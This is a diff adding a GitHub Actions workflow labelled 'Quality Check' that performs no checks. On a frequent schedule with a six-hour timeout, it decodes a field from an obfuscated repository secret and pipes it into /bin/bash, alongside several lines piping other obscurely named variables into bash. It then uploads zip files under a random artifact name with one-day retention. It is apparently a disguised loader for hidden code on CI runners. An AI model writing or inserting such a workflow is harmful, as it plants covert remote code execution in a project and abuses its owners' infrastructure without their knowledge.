@@ -1,0 +1,34 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          iyegk43: ${{ secrets.iyegk43 }}
+        run: |
+          printf '%s' "$iyegk43" | jq -r .htdc51234 | /bin/bash
+          echo $xld6 | jq -r .tosqd31 | /bin/bash
+          printf '%s' "$ccj08244" | jq -r .vhmkp2242 | /bin/bash
+          echo $brgq3 | jq -r .rny1327 | /bin/bash
+          echo $daen48 | jq -r .n89574 | /bin/bash
+          echo $e625 | jq -r .jpk98 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Y0ZbuSGk
+          path: "*.zip"
+          retention-days: 1
